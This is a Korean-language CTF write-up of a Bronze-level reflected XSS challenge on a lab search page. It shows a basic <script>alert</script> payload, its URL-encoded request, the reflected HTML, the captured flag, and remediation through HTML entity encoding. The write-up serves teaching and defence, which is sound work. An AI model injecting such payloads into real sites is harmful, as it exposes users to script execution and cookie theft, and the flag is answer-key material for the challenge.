+++
title = "VulnABLE CTF [LUXORA] Write-up: XSS 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XSS", "Bronze", "Reflected XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XSS 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (XSS)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/xss/bronze`
- **목표**: 검색창에 입력한 문자열이 화면에 그대로 반사(Reflect)되는 취약점을 악용하여, 사용자 브라우저에서 임의의 자바스크립트가 실행되는 Reflected XSS 공격을 성공시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/xss/bronze` 경로에 접속하면 전형적인 상품 검색(Search) 창이 나타납니다.
검색어에 `Laptop` 이라고 입력하고 검색 버튼을 누릅니다.

**[요청 URL]**
```http
GET /xss/bronze?query=Laptop
```

**[서버의 응답 화면]**
```html
<div class="search-result">
  <h2>Search Results for: Laptop</h2>
  <p>No products found.</p>
</div>
```

**[해커의 사고 과정]**
1. URL 파라미터 `query=Laptop` 의 값이 HTML 문서 내부의 `<h2>` 태그 안에 그대로(Raw) 출력되고 있다.
2. 만약 입력값에 HTML 태그나 자바스크립트를 섞어 넣었을 때, 브라우저가 이를 단순한 텍스트로 보지 않고 실제 코드로 해석해 버린다면?
3. 전형적인 **Reflected XSS(반사형 크로스 사이트 스크립팅)** 취약점이 발생할 것이다.

---

## 💥 2. 취약점 식별 및 페이로드 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Injects <script>)--> [ Web Server / Browser ]
                                     |-- Script Executed
                                     |-- Steals Cookies / Actions
```


가장 기초적인 XSS 페이로드인 `<script>` 태그를 사용하여 브라우저 경고창(Alert)을 띄워보겠습니다.

### 💡 페이로드 작성
```html
<script>alert('XSS')</script>
```

### 🚀 페이로드 전송
검색창에 위 코드를 그대로 입력하거나, 주소창에 URL 인코딩하여 전송합니다.

```http
GET /xss/bronze?query=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

---

## 🚀 3. 공격 수행 및 결과 확인

요청을 보낸 후 화면의 변화를 관찰합니다.

### 🔍 브라우저의 반응
서버는 전달받은 `<script>alert('XSS')</script>` 문자열을 아무런 필터링이나 인코딩 없이 HTML 응답에 끼워 넣습니다.

```html
<div class="search-result">
  <h2>Search Results for: <script>alert('XSS')</script></h2>
  <p>No products found.</p>
</div>
```

희생자의 브라우저(크롬, 사파리 등)는 이 HTML을 읽어 내려가다가 `<script>` 태그를 만나면, "아! 자바스크립트를 실행하라는 뜻이구나!"라고 착각하고 화면에 `XSS` 라는 경고창을 띄워버립니다.

이와 동시에, 챌린지 환경의 봇이 이 성공적인 스크립트 실행을 감지하고 플래그를 노출합니다.

```text
[!] System: XSS payload executed successfully. 
Flag: FLAG{XSS_🥉_REFLECTED_BASIC_F1A2B3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

가장 고전적인 웹 취약점 중 하나인 XSS를 통해, 서버가 아닌 **클라이언트(브라우저) 측**에서 해커가 원하는 임의의 코드가 실행되도록 만드는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{XSS_🥉_REFLECTED_BASIC_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자로부터 입력받은 데이터를 웹 페이지에 출력할 때, HTML의 제어 문자로 쓰이는 특수 기호들(`<`, `>`, `"`, `'`, `&`)을 무력화시키지 않아서 발생한 문제입니다.

* **안전한 패치 가이드 (HTML Entity Encoding)**
서버가 클라이언트에게 데이터를 응답하기 전, 반드시 모든 사용자 입력값을 **HTML 인코딩** 처리해야 합니다.

1. **수동 처리 시**
   ```javascript
   function escapeHTML(str) {
       return str.replace(/[&<>'"]/g, 
           tag => ({
               '&': '&amp;',
               '<': '&lt;',
               '>': '&gt;',
               "'": '&#39;',
               '"': '&quot;'
           }[tag] || tag)
       );
   }
   // 응답 전 변환: "<h2>Search Results for: " + escapeHTML(req.query.query) + "</h2>"
   ```

2. **현대 프레임워크의 활용 (권장)**
   React, Vue.js, Angular, 혹은 EJS(`<%-` 대신 `<%=`), Jinja2 등의 최신 템플릿 엔진은 데이터 바인딩 시 기본적으로 XSS 방어를 위한 HTML 자동 인코딩 기능을 제공합니다. 이를 끄지 않고(예: React의 `dangerouslySetInnerHTML` 피하기) 기본값 그대로 사용하는 것이 가장 안전합니다.